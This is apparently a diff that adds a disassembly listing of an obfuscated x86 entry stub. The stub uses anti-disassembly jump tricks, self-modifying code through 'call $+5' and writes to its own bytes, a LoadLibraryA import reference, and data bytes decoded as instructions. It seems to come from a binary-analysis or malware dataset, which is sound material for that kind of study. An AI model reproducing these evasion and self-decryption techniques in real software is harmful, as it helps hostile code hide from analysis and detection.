@@ -1,0 +1,127 @@
+_start
+jmp rw-data
+pushad
+jae rw-data
+jne rw-data
+imul esi [ edi - 0x70000 ] 0xffffffe3
+leave
+retn 0x8
+popad
+inc edx
+outsd
+js rw-data
+xor [ ebx + 0x4 ] 0x2ff77ad7
+xor [ ebx + 0x19 ] 0xb7430077
+test bl 0x6b
+mov bh 0x0
+add cl bh
+jmp ebx
+mov [ ecx + 0x7ad70473 ] 0x73812ff7
+sbb [ edi ] esi
+inc ebx
+mov bh 0xf6
+retn
+and al 0x83
+retn
+add [ eax ] al
+add [ ecx + 0x6e ] cl
+imul esi [ ebx + eax * 2 + 0x6f ] 0x6e6f6d6d
+inc ebx
+outsd
+outsb
+je rw-data
+0xebeb01eb 0xff0d
+outsd
+insb
+jae __export_name_ptr_table_2(KERNEL32:LoadLibraryA)
+add [ eax ] al
+dec esp
+outsd
+popad
+dec esp
+imul esp [ edx + 0x72 ] 0x41797261
+add [ eax ] al
+add [ edi + 0x65 ] al
+je rw-data
+[ ebp + 0x33 ]
+leave
+inc ecx
+loop rw-data
+jb rw-data
+0xeb0004eb 0xfffb
+jmp rw-data
+mov [ ebp + rw-data ] eax
+jmp rw-data
+add bl ch
+sti
+dec [ ebx + 0x404ecd95 ]
+add [ ebx - 0x3dfcc3be ] cl
+arpl [ ecx + 0x64 ] ax
+jb rw-data
+stc
+jb rw-data
+call sub_40b12f
+0xbea835a 0xe2ff
+add al 0x9a
+jmp rw-data
+jae rw-data
+call sub_40b167
+pmaddwd mm6 [ ebx + 0x11 ]
+jmp rw-data
+jae rw-data
+mov edx [ ebp + rw-data ]
+mov eax [ edx + 0x3c ]
+add eax edx
+cmp al 0x3
+retn 0x8589
+call $+5
+mov ebx [ esp ]
+add ebx 0x12
+sub [ ebx ] 0x6b1e8
+dec [ ebx - 0x3 ]
+sub [ esp ] 0x88
+fild [ esi ]
+or esp esp
+je rw-data
+add bl ch
+add [ eax + 0x60 ] ebp
+cmc
+jb rw-data
+adc ebx ebp
+push es
+0xeb1fed72 0xf507
+stc
+add [ esp ] 0x17
+retn
+retn
+cmc
+jb rw-data
+jmp rw-data
+push 0x483eceb
+and al 0x7
+jmp rw-data
+cmc
+jae rw-data
+cmc
+push [ esp ]
+add [ esp ] 0x7
+sub_40b167
+jmp rw-data
+cmc
+jb rw-data
+retn
+cmc
+jb rw-data
+jmp rw-data
+push 0x483eceb
+and al 0x7
+jmp rw-data
+cmc
+jae rw-data
+cmc
+push [ esp ]
+add [ esp ] 0x7
+sub_40b12f
+pop edx
+sub edx 0xb
+jmp edx
